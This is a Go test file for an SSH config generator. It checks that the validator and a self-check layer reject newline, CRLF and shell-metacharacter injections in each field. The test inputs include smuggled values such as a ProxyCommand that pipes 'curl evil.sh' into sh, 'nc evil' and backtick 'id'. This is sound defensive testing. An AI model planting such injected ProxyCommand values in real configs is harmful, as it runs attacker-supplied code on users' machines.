// sshconf 测试：重心在注入面穷举（别名/注释/HostName/IdentityFile 各条
// 换行注入通道逐一验证被拒）与 selfCheck 自证防线的独立有效性——自证
// 用例刻意绕过 Validate 直驱 render()，证明"校验漏网也不产出可注入文本"
// 不是空话。另覆盖幂等（字节级）、乱序输入、Enabled 过滤、空清单与
// ContainsAlias 的误命中排除。新增注入形态时先在此补行，再动校验器。
package sshconf

import (
	"strings"
	"testing"
)

func TestValidateAlias(t *testing.T) {
	cases := []struct {
		alias   string
		wantErr bool
		why     string
	}{
		// —— 合法形态 ——
		{"web", false, "纯字母"},
		{"web-1", false, "字母+连字符+数字"},
		{"srv_01", false, "下划线"},
		{"db-master-01", false, "多连字符"},
		{"a", false, "单字符"},
		{"0", false, "纯数字"},
		{strings.Repeat("z", maxAliasLen), false, "恰好 32 字符"},
		// —— 注入面与越界形态（全部必须被拒）——
		{"", true, "空串"},
		{"Web", true, "大写"},
		{"web.Example", true, "点"},
		{"a/b", true, "斜杠"},
		{"web 1", true, "空格"},
		{"web'1", true, "单引号"},
		{`web"1`, true, "双引号"},
		{"web\nHost evil", true, "换行"},
		{"web\r\nHost evil", true, "CRLF"},
		{"-web", true, "前导连字符（会被 ssh 当选项）"},
		{"web-", true, "尾随连字符"},
		{"web\t1", true, "制表符"},
		{strings.Repeat("a", maxAliasLen+1), true, "超长 33 字符"},
		{"web$HOME", true, "美元符"},
		{"web;evil", true, "分号"},
		{"web|nc evil", true, "管道符"},
		{"web`id`", true, "反引号"},
		{"中文主机", true, "非 ASCII"},
		{"\x00web", true, "NUL"},
	}
	for _, tc := range cases {
		t.Run(tc.why, func(t *testing.T) {
			err := ValidateAlias(tc.alias)
			if (err != nil) != tc.wantErr {
				t.Fatalf("ValidateAlias(%q) err=%v，wantErr=%v（%s）", tc.alias, err, tc.wantErr, tc.why)
			}
		})
	}
}

func TestValidate(t *testing.T) {
	cases := []struct {
		why     string
		h       Host
		wantErr bool
	}{
		// —— 合法形态 ——
		{"最小合法项（Port=0、可选项全空）", Host{Alias: "web1", HostName: "1.1.1.1", Enabled: true}, false},
		{"全字段项", Host{Alias: "nas", HostName: "192.168.1.10", Port: 2222, User: "root",
			IdentityFile: "~/.ssh/id_ed25519", Note: "家里 NAS", Enabled: true}, false},
		{"显式 22 端口", Host{Alias: "web2", HostName: "example.com", Port: 22}, false},
		{"IPv6 纯冒号地址（无点不误判端口）", Host{Alias: "n6", HostName: "fe80::1"}, false},
		{"域名大写合法（大写只在别名被禁）", Host{Alias: "web3", HostName: "Web.Example.COM"}, false},
		{"Windows 反斜杠路径", Host{Alias: "win", HostName: "10.0.0.1", IdentityFile: `C:\Users\Administrator\.ssh\id_ed25519`}, false},
		{"注释含空格与中文", Host{Alias: "n1", HostName: "1.1.1.1", Note: "键 在 U 盘 上"}, false},
		// —— 逐字段坏形态 ——
		{"别名大写", Host{Alias: "BAD", HostName: "1.1.1.1"}, true},
		{"别名空", Host{Alias: "", HostName: "1.1.1.1"}, true},
		{"HostName 空", Host{Alias: "web1", HostName: ""}, true},
		{"HostName 含空格", Host{Alias: "web1", HostName: "1.2.3. 4"}, true},
		{"HostName 注入换行", Host{Alias: "web1", HostName: "1.1.1.1\n    ProxyCommand evil"}, true},
		{"HostName 注入 CRLF", Host{Alias: "web1", HostName: "1.1.1.1\r\nHost evil"}, true},
		{"HostName ssh:// 前缀", Host{Alias: "web1", HostName: "ssh://user@host"}, true},
		{"HostName SSH:// 大小写混用", Host{Alias: "web1", HostName: "SSH://Host"}, true},
		{"HostName 内嵌 IPv4 端口", Host{Alias: "web1", HostName: "1.1.1.1:22"}, true},
		{"HostName 内嵌域名端口", Host{Alias: "web1", HostName: "example.com:2222"}, true},
		{"HostName 方括号端口地址", Host{Alias: "web1", HostName: "[::1]:22"}, true},
		{"HostName 控制字符", Host{Alias: "web1", HostName: "ho\x01st"}, true},
		{"HostName 制表符", Host{Alias: "web1", HostName: "host\tname"}, true},
		{"Port 负数", Host{Alias: "web1", HostName: "1.1.1.1", Port: -1}, true},
		{"Port 越上界", Host{Alias: "web1", HostName: "1.1.1.1", Port: 65536}, true},
		{"User 含空格", Host{Alias: "web1", HostName: "1.1.1.1", User: "root admin"}, true},
		{"User 注入换行", Host{Alias: "web1", HostName: "1.1.1.1", User: "root\n    ProxyCommand evil"}, true},
		{"IdentityFile 注入换行+ProxyCommand", Host{Alias: "web1", HostName: "1.1.1.1",
			IdentityFile: "~/.ssh/id\n    ProxyCommand evil"}, true},
		{"IdentityFile 前导空格", Host{Alias: "web1", HostName: "1.1.1.1", IdentityFile: " /k"}, true},
		{"IdentityFile 中段空格（不加引号必坏解析，宁拒不产坏配置）", Host{Alias: "web1", HostName: "1.1.1.1",
			IdentityFile: `C:\Users\My Name\.ssh\id`}, true},
		{"IdentityFile 含 CR", Host{Alias: "web1", HostName: "1.1.1.1", IdentityFile: "/k\r"}, true},
		{"Note 注入换行", Host{Alias: "web1", HostName: "1.1.1.1", Note: "好\nProxyCommand evil"}, true},
		{"Note 含 CR", Host{Alias: "web1", HostName: "1.1.1.1", Note: "好\r坏"}, true},
		{"Note 控制字符", Host{Alias: "web1", HostName: "1.1.1.1", Note: "\x00"}, true},
	}
	for _, tc := range cases {
		t.Run(tc.why, func(t *testing.T) {
			err := Validate(tc.h)
			if (err != nil) != tc.wantErr {
				t.Fatalf("Validate(%+v) err=%v，wantErr=%v", tc.h, err, tc.wantErr)
			}
		})
	}
}

// TestRenderRejectsInjection 注入用例穷举：Render 必须对每条注入通道
// 整体报错且零产出（错误串必须为空，宁罢工不产半本配置）。
func TestRenderRejectsInjection(t *testing.T) {
	cases := []struct {
		why   string
		hosts []Host
	}{
		{"别名带换行", []Host{{Alias: "web\n    ProxyCommand curl evil.sh|sh", HostName: "1.1.1.1", Enabled: true}}},
		{"别名带 CRLF", []Host{{Alias: "web\r\nHost evil", HostName: "1.1.1.1", Enabled: true}}},
		{"别名带前导连字符", []Host{{Alias: "-evil", HostName: "1.1.1.1", Enabled: true}}},
		{"别名带点", []Host{{Alias: "web.example", HostName: "1.1.1.1", Enabled: true}}},
		{"别名带空格", []Host{{Alias: "web 1", HostName: "1.1.1.1", Enabled: true}}},
		{"别名超长", []Host{{Alias: strings.Repeat("a", 33), HostName: "1.1.1.1", Enabled: true}}},
		{"别名空串", []Host{{Alias: "", HostName: "1.1.1.1", Enabled: true}}},
		{"注释带换行", []Host{{Alias: "web1", HostName: "1.1.1.1", Note: "好\nProxyCommand evil", Enabled: true}}},
		{"HostName 带空格", []Host{{Alias: "web1", HostName: "1.2.3. 4", Enabled: true}}},
		{"IdentityFile 带换行+ProxyCommand", []Host{{Alias: "web1", HostName: "1.1.1.1",
			IdentityFile: "~/.ssh/id\n    ProxyCommand evil", Enabled: true}}},
	}
	for _, tc := range cases {
		t.Run(tc.why, func(t *testing.T) {
			out, err := Render(tc.hosts)
			if err == nil {
				t.Fatalf("注入被放行（应报错）：%q", tc.why)
			}
			if out != "" {
				t.Fatalf("非法输入必须零产出，实际产出 %q", out)
			}
		})
	}
}

// TestSelfCheckIndependent 自证防线有效性验证：刻意绕过 Validate 直驱
// render()，注入文本必须仍被 selfCheck 拦下（报错信息必须落在"自证失败"
// 上，证明不是校验层顺手挡的——校验层这里根本没出勤）。
func TestSelfCheckIndependent(t *testing.T) {
	cases := []struct {
		why   string
		hosts []Host
	}{
		{"HostName 混入换行+段头（alias 不在清单）", []Host{
			{Alias: "web1", HostName: "1.2.3.4\nHost evil", Enabled: true}}},
		{"HostName 混入换行+段头（alias 恰好是自家合法别名）", []Host{
			{Alias: "web1", HostName: "1.1.1.1\nHost web2", Enabled: true},
			{Alias: "web2", HostName: "2.2.2.2", Enabled: true}}},
		{"IdentityFile 混入换行+ProxyCommand", []Host{
			{Alias: "web1", HostName: "1.1.1.1", IdentityFile: "~/.ssh/id\n    ProxyCommand evil", Enabled: true}}},
		{"User 混入换行", []Host{
			{Alias: "web1", HostName: "1.1.1.1", User: "root\n    ProxyCommand evil", Enabled: true}}},
		{"Note 混入换行", []Host{
			{Alias: "web1", HostName: "1.1.1.1", Note: "备用\nHost evil", Enabled: true}}},
	}
	for _, tc := range cases {
		t.Run(tc.why, func(t *testing.T) {
			out, err := render(tc.hosts)
			if err == nil {
				t.Fatalf("绕过 Validate 后产物 %q 竟被放行——自证是摆设", out)
			}
			if !strings.Contains(err.Error(), "自证失败") {
				t.Fatalf("应且仅应由 selfCheck 拦截，实际错误: %v", err)
			}
			if out != "" {
				t.Fatalf("自证失败必须零产出，实际 %q", out)
			}
		})
	}
}

// TestRenderGolden 一个完整段的行内容、行序、缩进与段间空行的逐字节断言。
func TestRenderGolden(t *testing.T) {
	// 乱序输入：web1 在前，产物必须 nas 在前（字典序）。
	in := []Host{
		{Alias: "web1", HostName: "1.1.1.1", Enabled: true},
		{Alias: "db1", HostName: "10.0.0.9", Enabled: false}, // 禁用项完全消失
		{Alias: "nas", HostName: "192.168.1.10", Port: 2222, User: "root",
			IdentityFile: "~/.ssh/id_ed25519", Note: "家里 NAS", Enabled: true},
	}
	want := strings.Join([]string{
		GeneratedHeader,
		"",
		"# 家里 NAS",
		"Host nas",
		"    HostName 192.168.1.10",
		"    Port 2222",
		"    User root",
		"    IdentityFile ~/.ssh/id_ed25519",
		"    IdentitiesOnly yes",
		"",
		"Host web1",
		"    HostName 1.1.1.1",
		"    IdentitiesOnly yes",
		"",
	}, "\n")
	got, err := Render(in)
	if err != nil {
		t.Fatal(err)
	}
	if got != want {
		t.Fatalf("golden 失配：\n---- got ----\n%s\n---- want ----\n%s", got, want)
	}
}

func TestRenderIdempotent(t *testing.T) {
	base := []Host{
		{Alias: "beta", HostName: "b.example.com", Port: 2200, User: "deploy", Enabled: true},
		{Alias: "alpha", HostName: "10.1.1.1", Enabled: true},
		{Alias: "gamma", HostName: "::1", Note: "网关", Enabled: true},
	}
	t.Run("同输入两次字节相同", func(t *testing.T) {
		s1, err := Render(base)
		if err != nil {
			t.Fatal(err)
		}
		s2, err := Render(base)
		if err != nil {
			t.Fatal(err)
		}
		if s1 != s2 {
			t.Fatal("同一输入两次渲染不一致，幂等破产")
		}
	})
	t.Run("乱序输入与正序输入产物相同", func(t *testing.T) {
		shuffled := []Host{base[2], base[0], base[1]}
		s1, err := Render(base)
		if err != nil {
			t.Fatal(err)
		}
		s2, err := Render(shuffled)
		if err != nil {
			t.Fatal(err)
		}
		if s1 != s2 {
			t.Fatal("乱序输入产物漂移（应按别名排序）")
		}
		if got := strings.Index(s2, "Host alpha"); got > strings.Index(s2, "Host beta") {
			t.Fatal("别名字典序落笔未生效")
		}
	})
	t.Run("追加禁用项不改产物", func(t *testing.T) {
		s1, err := Render(base)
		if err != nil {
			t.Fatal(err)
		}
		withDisabled := append(append([]Host{}, base...),
			Host{Alias: "zzz", HostName: "9.9.9.9", Enabled: false})
		s2, err := Render(withDisabled)
		if err != nil {
			t.Fatal(err)
		}
		if s1 != s2 {
			t.Fatal("禁用项渗入了产物")
		}
	})
}

func TestRenderEnabledFilter(t *testing.T) {
	t.Run("禁用项不出现在产物且不影响其他项", func(t *testing.T) {
		out, err := Render([]Host{
			{Alias: "web1", HostName: "1.1.1.1", Enabled: true},
			{Alias: "db1", HostName: "10.0.0.9", Enabled: false},
		})
		if err != nil {
			t.Fatal(err)
		}
		if ContainsAlias(out, "db1") {
			t.Fatalf("禁用项 %q 出现在产物:\n%s", "db1", out)
		}
		if !ContainsAlias(out, "web1") {
			t.Fatalf("启用项失踪:\n%s", out)
		}
		if n := strings.Count(out, "\nHost "); n != 1 {
			t.Fatalf("段头行数=%d，期望 1", n)
		}
	})
	t.Run("禁用项坏数据也整体报错（账本有脏即罢工）", func(t *testing.T) {
		if _, err := Render([]Host{
			{Alias: "web1", HostName: "1.1.1.1", Enabled: true},
			{Alias: "db\nx", HostName: "10.0.0.9", Enabled: false},
		}); err == nil {
			t.Fatal("Enabled=false 的坏项被静默吞掉")
		}
	})
}

func TestRenderEmpty(t *testing.T) {
	want := GeneratedHeader + "\n"
	cases := []struct {
		why   string
		hosts []Host
	}{
		{"nil 清单", nil},
		{"空切片", []Host{}},
		{"全禁用", []Host{{Alias: "web1", HostName: "1.1.1.1", Enabled: false}}},
	}
	for _, tc := range cases {
		t.Run(tc.why, func(t *testing.T) {
			out, err := Render(tc.hosts)
			if err != nil {
				t.Fatalf("空清单不应报错: %v", err)
			}
			if out != want {
				t.Fatalf("空清单产物应只剩头部，实际:\n%q", out)
			}
		})
	}
}

func TestRenderDuplicateAlias(t *testing.T) {
	t.Run("启用项之间重复别名整体报错", func(t *testing.T) {
		if _, err := Render([]Host{
			{Alias: "web1", HostName: "1.1.1.1", Enabled: true},
			{Alias: "web1", HostName: "2.2.2.2", Enabled: true},
		}); err == nil || !strings.Contains(err.Error(), "重复") {
			t.Fatalf("重复别名应报错，实际: %v", err)
		}
	})
	t.Run("启用与禁用同名合法（禁用者不进产物）", func(t *testing.T) {
		out, err := Render([]Host{
			{Alias: "web1", HostName: "1.1.1.1", Enabled: true},
			{Alias: "web1", HostName: "9.9.9.9", Enabled: false},
		})
		if err != nil {
			t.Fatal(err)
		}
		if n := strings.Count(out, "\nHost web1\n"); n != 1 {
			t.Fatalf("段头应恰一个，实际 %d 个:\n%s", n, out)
		}
	})
}

// TestRenderNoGlobalSection 纪律断言：永不生成 `Host *` 全局段；每段自带
// IdentitiesOnly yes。
func TestRenderNoGlobalSection(t *testing.T) {
	hosts := []Host{
		{Alias: "a1", HostName: "1.1.1.1", Enabled: true},
		{Alias: "b2", HostName: "2.2.2.2", User: "root", Enabled: true},
	}
	out, err := Render(hosts)
	if err != nil {
		t.Fatal(err)
	}
	if strings.Contains(out, "Host *") {
		t.Fatalf("产出了 Host * 全局段（抢用户地盘）:\n%s", out)
	}
	if n := strings.Count(out, "    IdentitiesOnly yes"); n != len(hosts) {
		t.Fatalf("IdentitiesOnly yes 行数=%d，期望=%d", n, len(hosts))
	}
}

func TestContainsAlias(t *testing.T) {
	rendered, err := Render([]Host{
		{Alias: "web1", HostName: "1.1.1.1", Enabled: true},
		{Alias: "nas", HostName: "192.168.1.10", Enabled: true},
	})
	if err != nil {
		t.Fatal(err)
	}
	cases := []struct {
		why     string
		content string
		alias   string
		want    bool
	}{
		{"渲染产物里命中首段", rendered, "web1", true},
		{"渲染产物里命中次段", rendered, "nas", true},
		{"渲染产物里未命中", rendered, "db1", false},
		{"多别名段头逐 token 命中", "Host a b c\n", "b", true},
		{"注释行不算段头", "# Host web1", "web1", false},
		{"缩进行不算段头", "    Host web1", "web1", false},
		{"HostAlias 前缀词不算", "HostAlias web1", "web1", false},
		{"小写 host 不命中（只认自家生成的规范形态）", "host web1", "web1", false},
		{"CRLF 文件照常命中", "Host web1\r\n", "web1", true},
		{"alias 非法恒 false", rendered, "Web1", false},
		{"alias 空串恒 false", rendered, "", false},
		{"alias 带空格恒 false", rendered, "bad alias", false},
		{"空文本无命中", "", "web1", false},
	}
	for _, tc := range cases {
		t.Run(tc.why, func(t *testing.T) {
			if got := ContainsAlias(tc.content, tc.alias); got != tc.want {
				t.Fatalf("ContainsAlias(%q, %q)=%v，want %v", tc.content, tc.alias, got, tc.want)
			}
		})
	}
}

// TestErrorMessagesSanity 出口错误自洽：包前缀不重复、字段名可定位。
// Render 对 Validate 的包装只加一层 "sshconf:"，防双前缀回潮。
func TestErrorMessagesSanity(t *testing.T) {
	_, err := Render([]Host{{Alias: "web1", HostName: "1.1.1.1\nHost evil", Enabled: true}})
	if err == nil {
		t.Fatal("应报错")
	}
	msg := err.Error()
	if n := strings.Count(msg, "sshconf:"); n != 1 {
		t.Fatalf("错误信息包前缀应恰一个，实际 %d 个: %s", n, msg)
	}
	if !strings.Contains(msg, "web1") || !strings.Contains(msg, "第 0 项") {
		t.Fatalf("错误应可定位到序号与别名: %s", msg)
	}
	if strings.Contains(msg, "%!") {
		t.Fatalf("错误信息含格式化残渣: %s", msg)
	}
}

// TestValidateHostNameIPv6Forms 锁一次真实误拒：旧启发式"含 : 又含 ."会把
// IPv4 映射形态 ::ffff:192.168.1.1 当成"把端口写进了地址栏"而拒收，而它是合法 IPv6。
// 现在先问 net.ParseIP：能解析成 IP 就放行，解析不了才怀疑内嵌端口。
func TestValidateHostNameIPv6Forms(t *testing.T) {
	accepted := []string{
		"2408:8207:1234::1",   // 裸 IPv6
		"fe80::1",             // 链路本地
		"::ffff:192.168.1.1",  // IPv4 映射（旧写法误拒的那条）
		"64:ff9b::192.0.2.33", // NAT64 合成地址
		"10.0.0.8",            // IPv4
		"nas.home.arpa",       // 域名
	}
	rejected := []string{
		"[2408::1]",      // 方括号属 ssh:// 形态
		"10.0.0.8:4090",  // 真把端口写进地址栏（既非合法 IP，又含 : 与 .）
		"ssh://10.0.0.8", // 协议前缀
		"10.0.0.8 ",      // 尾部空白（单 token 值纪律，先于 IP 判定）
	}
	for _, h := range accepted {
		if err := Validate(Host{Alias: "a1", HostName: h, Port: 22, User: "ops", IdentityFile: "~/k", Enabled: true}); err != nil {
			t.Errorf("合法地址 %q 被误拒: %v", h, err)
		}
	}
	for _, h := range rejected {
		if err := Validate(Host{Alias: "a1", HostName: h, Port: 22, User: "ops", IdentityFile: "~/k", Enabled: true}); err == nil {
			t.Errorf("非法地址 %q 竟被放行", h)
		}
	}
}

// TestAliasFromHost 锁派生规则：清单默认不让人为标识符做决策，派生必须稳定且合规。
func TestAliasFromHost(t *testing.T) {
	ok := []struct{ host, want string }{
		{"154.217.234.231", "154-217-234-231"},
		{"8.155.34.133", "8-155-34-133"},
		{"NAS.Home.ARPA", "nas-home-arpa"},
		{"2408:8207::1", "2408-8207-1"}, // IPv6：冒号折叠、连续符号只留一个
		{"  spaced.example.com  ", "spaced-example-com"},
		{"dev--01", "dev-01"},
		{"10.0.0.8:4090", "10-0-0-8-4090"}, // 地址里带端口也不炸（端口该走 Port 字段）
	}
	for _, c := range ok {
		got, err := AliasFromHost(c.host)
		if err != nil {
			t.Errorf("host %q 不该报错: %v", c.host, err)
			continue
		}
		if got != c.want {
			t.Errorf("host %q 派生为 %q，期望 %q", c.host, got, c.want)
		}
		if vErr := ValidateAlias(got); vErr != nil {
			t.Errorf("派生值 %q 竟不合法: %v", got, vErr)
		}
	}
	long := strings.Repeat("a", 40)
	got, err := AliasFromHost(long)
	if err != nil {
		t.Fatalf("长地址应截断而非报错: %v", err)
	}
	if len(got) > maxAliasLen || strings.HasSuffix(got, "-") {
		t.Errorf("截断后形状不对: %q (len=%d)", got, len(got))
	}
	// 派生不出合法值时必须报错要求显式命名，不能造 `h-1` 这类没人认得的无意义名。
	for _, bad := range []string{"服务器", "...", "-", "", "   "} {
		if g, err := AliasFromHost(bad); err == nil {
			t.Errorf("host %q 应要求显式命名，实得 %q", bad, g)
		}
	}
}

func TestUniqueAlias(t *testing.T) {
	taken := map[string]bool{"nas01": true, "nas01-2": true, "nas01-3": true}
	got, err := UniqueAlias("nas01", func(s string) bool { return taken[s] })
	if err != nil || got != "nas01-4" {
		t.Fatalf("去重应得 nas01-4，实得 %q err=%v", got, err)
	}
	if g, err := UniqueAlias("fresh", func(string) bool { return false }); err != nil || g != "fresh" {
		t.Errorf("无冲突不该加后缀，实得 %q err=%v", g, err)
	}
	// 基名已经顶到上限时，加后缀必须靠截短基名保住长度，且不能留下悬空连字符。
	base := strings.Repeat("b", maxAliasLen)
	longTaken := map[string]bool{base: true}
	g, err := UniqueAlias(base, func(s string) bool { return longTaken[s] })
	if err != nil {
		t.Fatalf("长基名去重失败: %v", err)
	}
	if len(g) > maxAliasLen || ValidateAlias(g) != nil {
		t.Errorf("长基名去重结果不合规: %q (len=%d)", g, len(g))
	}
	if _, err := UniqueAlias("bad name", func(string) bool { return false }); err == nil {
		t.Error("非法基名必须报错")
	}
}
